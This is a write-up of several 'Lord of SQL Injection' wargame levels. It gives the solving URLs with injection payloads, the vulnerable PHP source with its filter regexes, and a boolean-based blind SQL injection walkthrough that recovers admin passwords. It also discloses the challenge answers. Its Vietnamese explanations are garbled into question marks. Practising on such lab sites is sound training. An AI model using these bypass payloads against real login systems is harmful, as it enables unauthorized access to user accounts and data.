# LORD OF SQLINJECTION Write-ups

## Index

1. [gremlin](#gremlin)

2. [cobolt](#cobolt)

3. [goblin](#goblin)

4. [orc](#orc)

5. [wolfman](#wolfman)

6. [darkelf](#darkelf)

7. [orge](#orge)

8. [troll](#troll)

9. [vampire](#vampire)

10. [skeleton](#skeleton)

11. [golem](#golem)

12. [darkknight](#darkknight)


## gremlin

Link solve chall: https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=%27%20or%201=1--%20-&pw=abcxyz

```
query : select id from prob_gremlin where id='' or 1=1-- -' and pw='abcxyz'

GREMLIN Clear!
http://www.wechall.net
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

## cobolt

Link solve chall: https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin&pw=123%27)%20or%20id=%27admin%27%20--%20-

```
query : select id from prob_cobolt where id='admin' and pw=md5('123') or id='admin' -- -')

COBOLT Clear!
http://www.wechall.net
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

## goblin

Link solve chall: https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=123%20OR%20id=0x61646d696e

0x61646d696e l?? d???ng hexa c???a **admin**

```
query : select id from prob_goblin where id='guest' and no=123 OR id=0x61646d696e

Hello admin
GOBLIN Clear!
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## orc

https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=095a9852

B??i n??y s??? d???ng Boolean-based SQLi t????ng t??? b??i [orge]()

```
query : select id from prob_orc where id='admin' and pw='095a9852'

Hello admin
ORC Clear!
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

## wolfman

https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%0aor%0aid=%27admin

K?? t??? %0a thay th??? cho space

```
query : select id from prob_wolfman where id='guest' and pw='' or id='admin'

Hello admin
WOLFMAN Clear!
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

## darkelf

https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%0a||%0aid=%27admin

K?? t??? || thay th??? cho to??n t??? **or**

```
query : select id from prob_darkelf where id='guest' and pw='' || id='admin'

Hello admin
DARKELF Clear!
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```

## orge

Link challenge: [orge](https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php)

![image](https://user-images.githubusercontent.com/80137840/218033026-ad1f9b2a-5760-4248-93c2-6bba44dd88a2.png)

Server nh???n gi?? tr??? c???a param **pw** tr??n URL r???i ki???m tra n???u c?? chu???i **prob**, **or**, **and** kh??ng ph??n bi???t hoa th?????ng ho???c c??c k?? t??? '_', '.' , '()' th?? exit ch????ng tr??nh, n???u kh??ng c?? th?? server th???c hi???n truy v???n **Select id** t???i CSDL v?? ki???m tra xem n???u c?? k???t qu??? tr??? v??? th?? hi???n th??? `Hello {$result[id]}`.

Tuy nhi??n ????? solve ???????c chall n??y, server ki???m tra password c???a **admin** trong CSDL n???u gi???ng v???i **$_GET['pw']** th?? m???i solve chall. Nh?? v???y ta c???n ph???i t??m ???????c password c???a **admin**.

![image](https://user-images.githubusercontent.com/80137840/218042174-0fa65b85-8ae6-4c9c-8f53-026df2ae15ad.png)

????? c??u query th??? nh???t nh???n id='admin', ta inject ??o???n SQL nh?? sau: `'||id='admin'-- -` (s??? d???ng || do server filter **or**)

Khi ???? trang web hi???n th??? message `Hello admin`

![image](https://user-images.githubusercontent.com/80137840/218045671-b3c7642a-3483-45b1-8da9-692a912ade0a.png)

Th??? th??m v??o 1 ??i???u ki???n true th?? v???n xu???t hi???n message `Hello admin`

![image](https://user-images.githubusercontent.com/80137840/218045062-a39b98c9-b476-4465-8b8f-b36a9568110a.png)

S???a th??nh ??i???u ki???n false th?? kh??ng c??n xu???t hi???n message `Hello admin` n???a

![image](https://user-images.githubusercontent.com/80137840/218052546-7b6823df-26cc-4c69-9b9b-eb22941e3858.png)

Nh?? v???y, ta s??? s??? d???ng Boolean-based SQLi ????? t??m ra password c???a **admin**

Tr?????c h???t ????? t??m password, ta c???n t??m ????? d??i c???a password n??y b???ng ??o???n sql nh?? sau: `'||id='admin' && length(pw)=1-- -`. S??? d???ng Burp Intruder v???i length(pw) t??ng d???n v?? d???a v??o s??? xu???t hi???n c???a chu???i `Hello admin` ????? nh???n bi???t c??u query tr??? v??? **True**.

![image](https://user-images.githubusercontent.com/80137840/218048390-c855a59b-7ae1-4de6-b85b-3070406fb6a1.png)

Ta t??m ???????c length(pw) = 8

![image](https://user-images.githubusercontent.com/80137840/218048725-730a7542-20f8-45ea-a729-0827d93208b9.png)

Ti???p theo, t??m password ta s??? s??? d???ng h??m substr() ????? check boolean t???ng k?? t??? c???a password b???ng ??o???n sql nh?? sau: `' || id='admin' && substr(pw,1,1)='a'-- -` v?? ki???m tra v???i c??c k?? t??? t??? a-z, 0-9. T????ng t??? v???i t??m length(pw), ta c??ng d???a v??o s??? xu???t hi???n c???a chu???i `Hello admin` ????? nh???n bi???t c??u query tr??? v??? **True**.

![image](https://user-images.githubusercontent.com/80137840/218050460-9278cbfd-c995-4337-aa29-4c1271d7e830.png)

Ta t??m ???????c t???ng k?? t??? c???a password v???i t???ng v??? tr??

![image](https://user-images.githubusercontent.com/80137840/218051240-18353698-ca35-4f50-9e75-6ee889fa110d.png)

S???p x???p l???i ta ???????c password c???a **admin** l?? `7b751aec`

??i???n v??o query string ????? solve chall: `?pw=7b751aec`

![image](https://user-images.githubusercontent.com/80137840/218051701-665c3903-3874-4938-8640-6aeaeadf39b0.png)


## troll

https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=Admin

```
query : select id from prob_troll where id='Admin'

TROLL Clear!
http://www.wechall.net
<?php  
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match("/admin/", $_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
```

## vampire

Link challenge: [vampire](https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php)

![image](https://user-images.githubusercontent.com/80137840/218029919-57ccadaa-1da4-4d1a-96f5-547a90b55fb7.png)

Server nh???n gi?? tr??? c???a param **id** tr??n URL r???i ki???m tra n???u c?? k?? t??? nh??y ????n (') th?? exit ch????ng tr??nh, n???u kh??ng th?? replace ??i chu???i 'admin' c?? trong **$_GET[id]**. Sau ???? server th???c hi???n truy v???n `Select id` t???i CSDL v?? ki???m tra xem n???u k???t qu??? tr??? v??? c?? id = 'admin' th?? solve chall. 

Tuy nhi??n h??m str_replace() ch??? replace ??i 1 l???n n??n ta ch??? c???n l???ng 2 chu???i 'admin' v??o nhau l?? xong.

Query string: `?id=adadminmin`

![image](https://user-images.githubusercontent.com/80137840/218032286-84cf6640-8bcc-4a66-bea4-55bba7c01fa9.png)

## skeleton

https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27%20or%20id=%27admin%27--%20-

```
query : select id from prob_skeleton where id='guest' and pw='' or id='admin'-- -' and 1=0

SKELETON Clear!
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

## golem

https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=77d6290b

B??i n??y s??? d???ng Boolean-based SQLi, s??? d???ng **like** thay th??? to??n t??? '=' v?? s??? d???ng h??m substring() ????? t??m t???ng k?? t??? c???a password

![image](https://user-images.githubusercontent.com/80137840/218062678-35314461-5ac1-4d16-878a-37102bbbf05d.png)

```
query : select id from prob_golem where id='guest' and pw='77d6290b'

GOLEM Clear!
http://www.wechall.net
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

## darkknight
T????ng t??? m???y b??i tr??n #.#
